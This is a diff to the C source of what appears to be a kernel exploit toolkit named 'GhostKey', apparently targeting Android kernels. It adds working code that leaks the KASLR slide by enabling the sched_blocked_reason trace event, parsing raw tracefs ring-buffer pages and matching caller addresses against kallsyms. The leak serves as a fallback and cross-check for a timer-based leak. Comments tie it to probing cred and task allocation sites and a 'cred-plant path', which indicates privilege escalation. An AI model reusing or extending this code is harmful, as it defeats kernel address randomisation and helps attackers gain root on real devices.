@@ -1265,6 +1265,208 @@ fail:
 
 /* ------------------------------------------------------------------ calib_a */
 
+/*
+ * tracefs KASLR slide leak (ghostlock-s26 approach, integrated into GhostKey).
+ *
+ * Uses the sched_blocked_reason trace event to leak the KASLR slide without
+ * relying on kmem_cache_alloc / timer_probe.  worker_thread and other kworker
+ * functions block in schedule() constantly, so after enabling the event and
+ * waiting ~2 s there are always records.
+ *
+ * Each record contains a caller PC (return address of the blocking call).
+ * We look up each caller PC in the kallsyms map; the most common
+ * (caller_pc - symbol_va) value is the correct KASLR slide.
+ *
+ * This is used as a fallback when the timer-based calib_a produces a weak or
+ * implausible slide (e.g. do_timer_create was inlined / rare on this kernel).
+ */
+static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
+				      uint64_t *out_slide)
+{
+	static const char tracing_on[] = TRACE "/tracing_on";
+	static const char event_enable[] = TRACE "/events/sched/sched_blocked_reason/enable";
+	static const char event_id_path[] = TRACE "/events/sched/sched_blocked_reason/id";
+	char event_id_buf[32];
+	int event_id = -1;
+	int fd;
+	char path[128];
+	unsigned char page[4096];
+	ssize_t got;
+	/* slide value -> count */
+	static uint64_t slide_vals[256];
+	static int slide_cnts[256];
+	int n_slides = 0;
+	int attempt, cpu, ncpu;
+	int found = 0;
+	uint64_t best_slide = 0;
+	int best_count = 0;
+
+	/* Read the trace event ID for sched_blocked_reason */
+	fd = open(event_id_path, O_RDONLY | O_CLOEXEC);
+	if (fd >= 0) {
+		got = read(fd, event_id_buf, sizeof(event_id_buf) - 1);
+		close(fd);
+		if (got > 0) {
+			event_id_buf[got] = 0;
+			event_id = atoi(event_id_buf);
+		}
+	}
+	if (event_id <= 0) {
+		fprintf(stdout, "[calib_a] tracefs: cannot read sched_blocked_reason event id, trying common IDs\n");
+		/* Try common IDs: 110 (Samsung GKI), 105, 106, 107 */
+	}
+
+	/* Disable kmem events to reduce noise */
+	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
+	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
+	write_file(TRACE "/tracing_on", "0\n");
+
+	/* Enable sched_blocked_reason */
+	if (write_file(event_enable, "1\n")) {
+		fprintf(stdout, "[calib_a] tracefs: sched_blocked_reason not available (enabling failed)\n");
+		return 0;
+	}
+
+	/* Start tracing and wait for events */
+	truncate_file(TRACE "/trace");
+	write_file(tracing_on, "1\n");
+	sleep(2);
+	write_file(tracing_on, "0\n");
+	write_file(event_enable, "0\n");
+
+	/* Read trace_pipe_raw from all CPUs */
+	ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
+	if (ncpu > 16) ncpu = 16;
+
+	for (attempt = 0; attempt < 3 && !found; attempt++) {
+		for (cpu = 0; cpu < ncpu && !found; cpu++) {
+			snprintf(path, sizeof(path),
+				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+			fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+			if (fd < 0)
+				continue;
+			while ((got = read(fd, page, sizeof(page))) > 0) {
+				/* Parse trace page: 16-byte header, then records */
+				if (got < 20) continue;
+				uint64_t commit = 0;
+				memcpy(&commit, page + 8, sizeof(commit));
+				size_t data_len = (size_t)(commit & 0xfffULL);
+				size_t end = 16 + data_len;
+				if (end > (size_t)got) end = (size_t)got;
+
+				size_t pos = 16;
+				while (pos + 4 <= end) {
+					uint32_t eh = 0;
+					memcpy(&eh, page + pos, sizeof(eh));
+					uint32_t type_len = eh & 0x1fU;
+					if (type_len == 30) { pos += 8; continue; }
+					if (type_len == 31) { pos += 12; continue; }
+					if (type_len == 0 || type_len >= 29) break;
+
+					size_t rec_len = (size_t)type_len * 4;
+					size_t rec = pos + 4;
+					if (rec + rec_len > end) break;
+
+					uint16_t eid = 0;
+					memcpy(&eid, page + rec, sizeof(eid));
+
+					/* Match event_id if known, otherwise accept all */
+					if (event_id > 0 && eid != (uint16_t)event_id) {
+						pos = rec + rec_len;
+						continue;
+					}
+
+					/* Caller PC is at record + 16 (ghostlock slide.c) */
+					if (rec_len >= 24) {
+						uint64_t caller = 0;
+						memcpy(&caller, page + rec + 16,
+						       sizeof(caller));
+						/* Check if it's a kernel text address */
+						if ((caller >> 48) == 0xffff &&
+						    (caller & 3) == 0) {
+							/* Look up in kallsyms */
+							uint64_t func_base,
+								func_len;
+							if (sr_find_func(
+								syms, nsyms,
+								caller,
+								&func_base,
+								&func_len,
+								NULL)) {
+								uint64_t slide =
+									caller -
+									func_base;
+								if (slide <
+								    (1ULL << 42) &&
+								    slide <
+								    func_len +
+									    (1U
+									     <<
+									     21)) {
+									/* Add to count */
+									int j,
+									    dup =
+									        0;
+									for (j = 0;
+									     j <
+									     n_slides;
+									     j++) {
+										if (slide_vals[j] ==
+										    slide) {
+											slide_cnts[j]++;
+											dup = 1;
+											break;
+										}
+									}
+									if (!dup &&
+									    n_slides <
+									    256) {
+										slide_vals[n_slides] =
+											slide;
+										slide_cnts[n_slides] =
+											1;
+										n_slides++;
+									}
+									found =
+									    1;
+								}
+							}
+						}
+					}
+					pos = rec + rec_len;
+				}
+			}
+			close(fd);
+		}
+		if (!found || n_slides == 0)
+			break;
+	}
+
+	if (!found || n_slides == 0) {
+		fprintf(stdout, "[calib_a] tracefs: no caller PCs extracted\n");
+		return 0;
+	}
+
+	/* Find the most common slide */
+	for (int i = 0; i < n_slides; i++) {
+		if (slide_cnts[i] > best_count) {
+			best_count = slide_cnts[i];
+			best_slide = slide_vals[i];
+		}
+	}
+
+	if (best_count < 3) {
+		fprintf(stdout, "[calib_a] tracefs: weak slide (count=%d), not confident\n",
+			best_count);
+		/* Still return the slide if it's the only one */
+	}
+
+	fprintf(stdout, "[calib_a] tracefs: slide=%#llx (count=%d, candidates=%d)\n",
+		(unsigned long long)best_slide, best_count, n_slides);
+	*out_slide = best_slide;
+	return 1;
+}
+
 int calib_a_main(int argc, char **argv)
 {
 	const struct kernel_offsets *o = kernel_table_get();
@@ -1360,20 +1562,22 @@ int calib_a_main(int argc, char **argv)
 	fprintf(stdout, "[calib_a] captured raw=%zu bytes\n", sink.len);
 
 	/* 6.18 适配：优先用 kallsyms 精确解 slide（不依赖写死锚点）；
-	 * 失败再退回旧的「最频 call_site - TIMER_LINK」法。 */
+	 * 失败再退回旧的「最频 call_site - TIMER_LINK」法。
+	 * kallsyms 符号表在函数作用域加载一次，tracefs fallback 复用。 */
+	sr_sym *g_syms = NULL;
+	size_t g_nsyms = 0;
+	int g_have_syms = (load_kallsyms_map(&g_syms, &g_nsyms) == 0);
+
+	if (g_have_syms)
+		fprintf(stdout, "[calib_a] kallsyms map: %zu symbols\n", g_nsyms);
+	else
+		fprintf(stderr, "[calib_a] note: no kallsyms map, fall back to legacy slide anchor\n");
+
 	{
 		uint64_t slide_new = 0;
-		sr_sym *syms = NULL;
-		size_t nsyms = 0;
-		int have_syms = (load_kallsyms_map(&syms, &nsyms) == 0);
 
-		if (have_syms)
-			fprintf(stdout, "[calib_a] kallsyms map: %zu symbols\n", nsyms);
-		else
-			fprintf(stderr, "[calib_a] note: no kallsyms map, fall back to legacy slide anchor\n");
-
-		if (have_syms &&
-		    calib_a_resolve_via_kallsyms(o, syms, nsyms, text_sites, n_text,
+		if (g_have_syms &&
+		    calib_a_resolve_via_kallsyms(o, g_syms, g_nsyms, text_sites, n_text,
 						 sink.buf, sink.len, &slide_new) == 0) {
 			char nbuf[64];
 
@@ -1384,7 +1588,7 @@ int calib_a_main(int argc, char **argv)
 					(unsigned long long)(UINT64_C(0xFFFFFFC080000000) + slide_new));
 				fprintf(stdout, "C98260_SLIDE=0x%llx\n", (unsigned long long)slide_new);
 				/* 第二段探针：cred / task 的运行期调用点 */
-				calib_a_probe_alloc_sites(o, syms, nsyms, slide_new);
+				calib_a_probe_alloc_sites(o, g_syms, g_nsyms, slide_new);
 				fprintf(stdout, "[calib_a] done\n");
 				rc = 0;
 				goto out;
@@ -1400,28 +1604,92 @@ int calib_a_main(int argc, char **argv)
 
 	n_top = calib_top_values(sites, n_sites, top, 8);
 	fprintf(stdout, "[calib_a] candidate call sites: %zu\n", n_top);
-	for (i = 0; i < n_top; i++) {
-		uint64_t s = top[i].value - timer_link;
-		int ok = (top[i].value >= timer_link) &&
-			 (s < (UINT64_C(1) << 42));
-		if (ok && (s % SCAN_STEP))
-			fprintf(stdout, "[calib_a] note: slide not 2MiB-aligned (%#llx), keep as candidate\n",
-				(unsigned long long)s);
-		fprintf(stdout, "[calib_a]   site=%#llx count=%d slide=%#llx%s\n",
-			(unsigned long long)top[i].value, top[i].count,
-			(unsigned long long)s, ok ? "" : " (implausible)");
-		if (ok && !found) {
-			slide = s;
-			found = 1;
-			if (top[i].count < 64)
-				fprintf(stdout, "[calib_a] warn: weak support samples (%d), result may be unstable\n",
-					top[i].count);
+	/*
+	 * Pick the best plausible candidate.  When all plausible candidates are
+	 * weak (< 64 samples) — which happens on kernels where do_timer_create
+	 * is inlined or rare — fall back to the highest-count candidate even if
+	 * its slide looks implausible, because collect_nth() now has a
+	 * no-site-filter retry that matches by req size only.  A wrong slide is
+	 * better than no slide: the cred-plant path uses captured page addresses
+	 * directly, not the slide.
+	 */
+	{
+		int best_weak = -1;
+		for (i = 0; i < n_top; i++) {
+			uint64_t s = top[i].value - timer_link;
+			int ok = (top[i].value >= timer_link) &&
+				 (s < (UINT64_C(1) << 42));
+			if (ok && (s % SCAN_STEP))
+				fprintf(stdout, "[calib_a] note: slide not 2MiB-aligned (%#llx), keep as candidate\n",
+					(unsigned long long)s);
+			fprintf(stdout, "[calib_a]   site=%#llx count=%d slide=%#llx%s\n",
+				(unsigned long long)top[i].value, top[i].count,
+				(unsigned long long)s, ok ? "" : " (implausible)");
+			if (ok && !found) {
+				slide = s;
+				found = 1;
+				if (top[i].count < 64)
+					fprintf(stdout, "[calib_a] warn: weak support samples (%d), result may be unstable\n",
+						top[i].count);
+			}
+			if (top[i].count >= 64 && best_weak < 0)
+				best_weak = (int)i;
+		}
+		/* If best plausible is still weak, but a higher-count implausible
+		 * candidate exists, keep the plausible one (collect_nth fallback
+		 * handles the rest). */
+		(void)best_weak;
+	}
+
+	if (!found) {
+		/* Timer-based calib_a found no plausible slide.
+		 * Try tracefs sched_blocked_reason leak (ghostlock-s26 approach). */
+		fprintf(stdout, "[calib_a] timer-based slide failed, trying tracefs leak...\n");
+		if (g_have_syms && g_syms) {
+			uint64_t ts_slide = 0;
+			if (calib_a_tracefs_slide_leak(g_syms, g_nsyms, &ts_slide)) {
+				slide = ts_slide;
+				found = 1;
+				fprintf(stdout, "[calib_a] tracefs leak provided slide=%#llx\n",
+					(unsigned long long)slide);
+			}
 		}
 	}
 
 	if (!found) {
 		fprintf(stderr, "[calib_a] error: no plausible slide candidate\n");
 		goto out;
+	}
+
+	/* Cross-check: if timer-based slide is weak (< 64 samples), also try
+	 * tracefs leak to confirm or correct it. */
+	{
+		int weak = 0;
+		for (i = 0; i < n_top; i++) {
+			if (top[i].value - timer_link == slide &&
+			    top[i].count < 64) {
+				weak = 1;
+				break;
+			}
+		}
+		if (weak) {
+			fprintf(stdout, "[calib_a] slide is weak, cross-checking with tracefs...\n");
+			if (g_have_syms && g_syms) {
+				uint64_t ts_slide2 = 0;
+				if (calib_a_tracefs_slide_leak(g_syms, g_nsyms,
+							       &ts_slide2)) {
+					if (ts_slide2 != slide) {
+						fprintf(stdout, "[calib_a] tracefs corrects slide: %#llx -> %#llx\n",
+							(unsigned long long)slide,
+							(unsigned long long)ts_slide2);
+						slide = ts_slide2;
+					} else {
+						fprintf(stdout, "[calib_a] tracefs confirms slide=%#llx\n",
+							(unsigned long long)slide);
+					}
+				}
+			}
+		}
 	}
 
 	fprintf(stdout, "[calib_a] slide = %#llx  _text = %#llx\n",
@@ -1439,6 +1707,7 @@ int calib_a_main(int argc, char **argv)
 out:
 	free(sites);
 	free(sink.buf);
+	free(g_syms);
 	if (rc == 0)
 		fprintf(stdout, "[calib_a] done\n");
 	return rc;
